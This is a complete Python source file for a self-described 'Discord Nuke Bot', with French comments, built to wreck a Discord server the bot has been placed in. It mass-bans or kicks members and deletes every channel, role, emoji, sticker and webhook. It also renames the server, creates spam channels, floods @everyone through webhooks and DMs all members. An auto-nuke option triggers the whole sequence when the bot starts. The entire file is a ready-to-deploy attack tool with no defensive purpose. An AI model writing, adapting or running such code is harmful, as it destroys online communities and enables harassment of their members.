# language: Python 3.11, file: bot.py, target: Discord API v10 + Railway
# Discord Nuke Bot — full option suite

import os
import sys
import asyncio
import aiohttp
from typing import Optional, List

import discord
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

# ───────────────────── CONFIG FROM ENV ─────────────────────
TOKEN = os.getenv("TOKEN", "").strip()
OWNER_IDS = {int(x.strip()) for x in os.getenv("OWNER_IDS", "").split(",") if x.strip().isdigit()}
PREFIX = os.getenv("PREFIX", "!")

NUKE_NAME = os.getenv("NUKE_NAME", "NUKED")
SPAM_CHANNELS = int(os.getenv("SPAM_CHANNELS", "50"))
SPAM_MESSAGES = int(os.getenv("SPAM_MESSAGES", "10"))
SPAM_TEXT = os.getenv("SPAM_TEXT", "@everyone NUKED")
WEBHOOK_SPAM = os.getenv("WEBHOOK_SPAM", "true").lower() in ("1", "true", "yes")
BAN_REASON = os.getenv("BAN_REASON", "nuked")
DELETE_ROLES = os.getenv("DELETE_ROLES", "true").lower() in ("1", "true", "yes")
DELETE_EMOJIS = os.getenv("DELETE_EMOJIS", "true").lower() in ("1", "true", "yes")
DELETE_STICKERS = os.getenv("DELETE_STICKERS", "true").lower() in ("1", "true", "yes")
DELETE_WEBHOOKS = os.getenv("DELETE_WEBHOOKS", "true").lower() in ("1", "true", "yes")
BAN_ALL = os.getenv("BAN_ALL", "true").lower() in ("1", "true", "yes")
KICK_INSTEAD = os.getenv("KICK_INSTEAD", "false").lower() in ("1", "true", "yes")
SKIP_BOTS = os.getenv("SKIP_BOTS", "false").lower() in ("1", "true", "yes")
SKIP_OWNER = os.getenv("SKIP_OWNER", "true").lower() in ("1", "true", "yes")
CHANGE_ICON = os.getenv("CHANGE_ICON", "false").lower() in ("1", "true", "yes")
ICON_URL = os.getenv("ICON_URL", "").strip()
CREATE_ROLES = int(os.getenv("CREATE_ROLES", "0"))
ROLE_NAME = os.getenv("ROLE_NAME", "nuked")
CHANNEL_NAME = os.getenv("CHANNEL_NAME", "nuked")
DM_MESSAGE = os.getenv("DM_MESSAGE", "").strip()
LOG_CHANNEL = os.getenv("LOG_CHANNEL", "").strip()
AUTO_NUKE_GUILD = os.getenv("AUTO_NUKE_GUILD", "").strip()
RATE_LIMIT_DELAY = float(os.getenv("RATE_LIMIT_DELAY", "0.3"))

if not TOKEN:
    print("[-] TOKEN manquant")
    sys.exit(1)
if not OWNER_IDS:
    print("[-] OWNER_IDS manquant (au moins un ID)")
    sys.exit(1)

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
intents.emojis_and_stickers = True
intents.webhooks = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)


def is_owner_check():
    async def predicate(ctx: commands.Context):
        return ctx.author.id in OWNER_IDS
    return commands.check(predicate)


async def log(msg: str, guild: Optional[discord.Guild] = None):
    print(msg)
    if LOG_CHANNEL and guild:
        ch = guild.get_channel(int(LOG_CHANNEL)) if LOG_CHANNEL.isdigit() else None
        if ch:
            try:
                await ch.send(f"```{msg[:1900]}```")
            except Exception:
                pass


async def safe_delay():
    if RATE_LIMIT_DELAY > 0:
        await asyncio.sleep(RATE_LIMIT_DELAY)


# ───────────────────── CORE ACTIONS ─────────────────────

async def action_ban_all(guild: discord.Guild) -> int:
    me = guild.me
    owner = guild.owner
    count = 0
    members = list(guild.members)
    for m in members:
        if m.id == me.id:
            continue
        if SKIP_OWNER and owner and m.id == owner.id:
            continue
        if SKIP_BOTS and m.bot:
            continue
        try:
            if DM_MESSAGE:
                try:
                    await m.send(DM_MESSAGE)
                except Exception:
                    pass
            if KICK_INSTEAD:
                await m.kick(reason=BAN_REASON)
            else:
                await m.ban(reason=BAN_REASON, delete_message_days=0)
            count += 1
        except Exception:
            pass
        await safe_delay()
    return count


async def action_delete_channels(guild: discord.Guild) -> int:
    count = 0
    for ch in list(guild.channels):
        try:
            await ch.delete()
            count += 1
        except Exception:
            pass
        await safe_delay()
    return count


async def action_delete_roles(guild: discord.Guild) -> int:
    me = guild.me
    count = 0
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        if me and role >= me.top_role:
            continue
        try:
            await role.delete()
            count += 1
        except Exception:
            pass
        await safe_delay()
    return count


async def action_delete_emojis(guild: discord.Guild) -> int:
    count = 0
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
            count += 1
        except Exception:
            pass
        await safe_delay()
    return count


async def action_delete_stickers(guild: discord.Guild) -> int:
    count = 0
    for sticker in list(guild.stickers):
        try:
            await sticker.delete()
            count += 1
        except Exception:
            pass
        await safe_delay()
    return count


async def action_delete_webhooks(guild: discord.Guild) -> int:
    count = 0
    try:
        webhooks = await guild.webhooks()
        for wh in webhooks:
            try:
                await wh.delete()
                count += 1
            except Exception:
                pass
            await safe_delay()
    except Exception:
        pass
    return count


async def action_rename(guild: discord.Guild, name: str) -> bool:
    try:
        kwargs = {"name": name[:100]}
        if CHANGE_ICON and ICON_URL:
            async with aiohttp.ClientSession() as session:
                async with session.get(ICON_URL) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        kwargs["icon"] = data
        await guild.edit(**kwargs)
        return True
    except Exception:
        return False


async def action_create_channels(guild: discord.Guild, n: int, name_base: str) -> List[discord.TextChannel]:
    created = []
    for i in range(n):
        try:
            ch = await guild.create_text_channel(f"{name_base}-{i}")
            created.append(ch)
        except Exception:
            break
        await safe_delay()
    return created


async def action_create_roles(guild: discord.Guild, n: int, name_base: str) -> int:
    count = 0
    for i in range(n):
        try:
            await guild.create_role(name=f"{name_base}-{i}")
            count += 1
        except Exception:
            break
        await safe_delay()
    return count


async def action_spam_messages(channels: List[discord.TextChannel], text: str, times: int):
    for ch in channels:
        for _ in range(times):
            try:
                await ch.send(text)
            except Exception:
                break
            await safe_delay()


async def action_webhook_spam(guild: discord.Guild, channels: List[discord.TextChannel], text: str, times: int):
    for ch in channels:
        try:
            wh = await ch.create_webhook(name="nuke")
            for _ in range(times):
                try:
                    await wh.send(text, username="NUKE", allowed_mentions=discord.AllowedMentions(everyone=True))
                except Exception:
                    break
            try:
                await wh.delete()
            except Exception:
                pass
        except Exception:
            # fallback normal send
            for _ in range(times):
                try:
                    await ch.send(text)
                except Exception:
                    break
        await safe_delay()


async def action_dm_all(guild: discord.Guild, message: str) -> int:
    count = 0
    for m in list(guild.members):
        if m.bot or m.id == guild.me.id:
            continue
        try:
            await m.send(message)
            count += 1
        except Exception:
            pass
        await safe_delay()
    return count


async def full_nuke(guild: discord.Guild):
    await log(f"[*] NUKE START → {guild.name} ({guild.id})", guild)

    # 1. Ban / Kick
    if BAN_ALL:
        n = await action_ban_all(guild)
        await log(f"[+] Ban/Kick: {n}", guild)

    # 2. Delete webhooks
    if DELETE_WEBHOOKS:
        n = await action_delete_webhooks(guild)
        await log(f"[+] Webhooks deleted: {n}", guild)

    # 3. Delete channels
    n = await action_delete_channels(guild)
    await log(f"[+] Channels deleted: {n}", guild)

    # 4. Delete roles
    if DELETE_ROLES:
        n = await action_delete_roles(guild)
        await log(f"[+] Roles deleted: {n}", guild)

    # 5. Delete emojis
    if DELETE_EMOJIS:
        n = await action_delete_emojis(guild)
        await log(f"[+] Emojis deleted: {n}", guild)

    # 6. Delete stickers
    if DELETE_STICKERS:
        n = await action_delete_stickers(guild)
        await log(f"[+] Stickers deleted: {n}", guild)

    # 7. Rename + icon
    ok = await action_rename(guild, NUKE_NAME)
    await log(f"[+] Rename: {ok}", guild)

    # 8. Create spam roles
    if CREATE_ROLES > 0:
        n = await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)
        await log(f"[+] Roles created: {n}", guild)

    # 9. Create spam channels + flood
    channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
    await log(f"[+] Channels created: {len(channels)}", guild)

    if channels:
        if WEBHOOK_SPAM:
            await action_webhook_spam(guild, channels, SPAM_TEXT, SPAM_MESSAGES)
        else:
            await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
        await log(f"[+] Spam done ({SPAM_MESSAGES}x per channel)", guild)

    await log("[*] NUKE COMPLETE", guild)


# ───────────────────── EVENTS ─────────────────────

@bot.event
async def on_ready():
    print(f"[+] Online as {bot.user} | guilds: {len(bot.guilds)}")
    print(f"[+] Owners: {OWNER_IDS}")
    if AUTO_NUKE_GUILD and AUTO_NUKE_GUILD.isdigit():
        g = bot.get_guild(int(AUTO_NUKE_GUILD))
        if g:
            print(f"[+] AUTO_NUKE → {g.name}")
            await full_nuke(g)
        else:
            print(f"[-] AUTO_NUKE guild {AUTO_NUKE_GUILD} not found")


# ───────────────────── COMMANDS ─────────────────────

@bot.command(name="nuke")
@is_owner_check()
async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
    """Nuke complet du serveur (ou guild_id)"""
    target = bot.get_guild(guild_id) if guild_id else ctx.guild
    if not target:
        await ctx.send("Guild introuvable.")
        return
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await full_nuke(target)


@bot.command(name="banall")
@is_owner_check()
async def cmd_banall(ctx: commands.Context):
    """Ban (ou kick) tous les membres"""
    n = await action_ban_all(ctx.guild)
    await ctx.send(f"Ban/Kick: {n}")


@bot.command(name="kickall")
@is_owner_check()
async def cmd_kickall(ctx: commands.Context):
    """Kick tous les membres"""
    global KICK_INSTEAD
    old = KICK_INSTEAD
    KICK_INSTEAD = True
    n = await action_ban_all(ctx.guild)
    KICK_INSTEAD = old
    await ctx.send(f"Kicked: {n}")


@bot.command(name="delchannels")
@is_owner_check()
async def cmd_delchannels(ctx: commands.Context):
    """Supprime tous les channels"""
    n = await action_delete_channels(ctx.guild)
    await ctx.send(f"Channels deleted: {n}")


@bot.command(name="delroles")
@is_owner_check()
async def cmd_delroles(ctx: commands.Context):
    """Supprime tous les rôles"""
    n = await action_delete_roles(ctx.guild)
    await ctx.send(f"Roles deleted: {n}")


@bot.command(name="delemojis")
@is_owner_check()
async def cmd_delemojis(ctx: commands.Context):
    """Supprime emojis + stickers"""
    e = await action_delete_emojis(ctx.guild)
    s = await action_delete_stickers(ctx.guild)
    await ctx.send(f"Emojis: {e} | Stickers: {s}")


@bot.command(name="spam")
@is_owner_check()
async def cmd_spam(ctx: commands.Context, count: int = 20):
    """Crée N channels et flood"""
    channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
    if WEBHOOK_SPAM:
        await action_webhook_spam(ctx.guild, channels, SPAM_TEXT, SPAM_MESSAGES)
    else:
        await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
    await ctx.send(f"Spam: {len(channels)} channels")


@bot.command(name="webhookspam")
@is_owner_check()
async def cmd_webhookspam(ctx: commands.Context, count: int = 20):
    """Spam via webhooks uniquement"""
    channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
    await action_webhook_spam(ctx.guild, channels, SPAM_TEXT, SPAM_MESSAGES)
    await ctx.send(f"Webhook spam: {len(channels)} channels")


@bot.command(name="rename")
@is_owner_check()
async def cmd_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
    """Renomme le serveur"""
    ok = await action_rename(ctx.guild, name)
    await ctx.send(f"Rename: {ok}")


@bot.command(name="createchannels")
@is_owner_check()
async def cmd_createchannels(ctx: commands.Context, n: int = 10):
    """Crée N channels"""
    channels = await action_create_channels(ctx.guild, n, CHANNEL_NAME)
    await ctx.send(f"Created: {len(channels)}")


@bot.command(name="createroles")
@is_owner_check()
async def cmd_createroles(ctx: commands.Context, n: int = 10):
    """Crée N rôles"""
    count = await action_create_roles(ctx.guild, n, ROLE_NAME)
    await ctx.send(f"Roles created: {count}")


@bot.command(name="dmall")
@is_owner_check()
async def cmd_dmall(ctx: commands.Context, *, message: str):
    """DM tous les membres"""
    n = await action_dm_all(ctx.guild, message)
    await ctx.send(f"DM sent: {n}")


@bot.command(name="leave")
@is_owner_check()
async def cmd_leave(ctx: commands.Context):
    """Quitte le serveur"""
    await ctx.send("Leaving...")
    await ctx.guild.leave()


@bot.command(name="guilds")
@is_owner_check()
async def cmd_guilds(ctx: commands.Context):
    """Liste les serveurs"""
    lines = [f"{g.name} | {g.id} | members={g.member_count}" for g in bot.guilds]
    text = "\n".join(lines) or "Aucun"
    await ctx.send(f"```{text[:1900]}```")


@bot.command(name="status")
@is_owner_check()
async def cmd_status(ctx: commands.Context):
    """État du bot"""
    await ctx.send(
        f"Guilds: {len(bot.guilds)}\n"
        f"Latency: {round(bot.latency*1000)}ms\n"
        f"Prefix: {PREFIX}\n"
        f"Owners: {OWNER_IDS}"
    )


@bot.command(name="helpnuke")
@is_owner_check()
async def cmd_help(ctx: commands.Context):
    """Aide des commandes"""
    help_text = f"""```
{PREFIX}nuke [guild_id]     — nuke complet
{PREFIX}banall             — ban/kick massif
{PREFIX}kickall            — kick massif
{PREFIX}delchannels        — delete all channels
{PREFIX}delroles           — delete all roles
{PREFIX}delemojis          — delete emojis+stickers
{PREFIX}spam [n]           — create n channels + flood
{PREFIX}webhookspam [n]    — webhook spam
{PREFIX}rename [name]      — rename server
{PREFIX}createchannels [n] — create n channels
{PREFIX}createroles [n]    — create n roles
{PREFIX}dmall <msg>        — DM everyone
{PREFIX}leave              — leave server
{PREFIX}guilds             — list guilds
{PREFIX}status             — bot status
{PREFIX}helpnuke           — this help
```"""
    await ctx.send(help_text)


if __name__ == "__main__":
    bot.run(TOKEN)
